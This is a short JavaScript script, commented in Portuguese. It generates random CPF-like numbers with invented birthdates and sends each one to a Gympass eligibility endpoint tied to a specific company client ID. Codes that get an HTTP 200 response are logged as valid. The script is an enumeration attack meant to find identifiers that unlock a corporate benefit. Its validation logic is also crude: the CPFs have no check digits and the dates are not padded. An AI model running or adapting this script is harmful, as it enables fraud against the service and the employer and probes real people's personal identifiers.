// Função para gerar um código aleatório
function generateCode() {
  const cpf = Math.floor(Math.random() * 99999999999);
  const birthdate = `01${Math.floor(Math.random() * 12) + 1}${Math.floor(Math.random() * 100) + 1900}`;
  return `${cpf}${birthdate}`;
}

// Função para validar um código
async function validateCode(code) {
  const url = `https://www.gympass.com/sign-up/eligibility/?user_country=br&user_language=pt-BR&_ga=2.200057322.518943420.1709998692-1295055909.1673271650&_gl=1*16d49tv*_gcl_au*MTIyNjU2MzMzNS4xNzA5OTk4Njky&client_id=530fa256-a7fe-46b6-ac2c-6b9ecbc8334d&company_name=METRUS&country_name=BR&data=${code}`;
  const response = await fetch(url);
  return response.status === 200;
}

// Função para testar e separar os códigos
async function testCodes() {
  const validCodes = [];
  const invalidCodes = [];

  for (let i = 0; i < 100; i++) {
    const code = generateCode();
    const isValid = await validateCode(code);

    if (isValid) {
      validCodes.push(code);
    } else {
      invalidCodes.push(code);
    }
  }

  console.log("Códigos válidos:", validCodes);
  console.log("Códigos inválidos:", invalidCodes);
}

// Executar a função para testar 100 códigos
testCodes();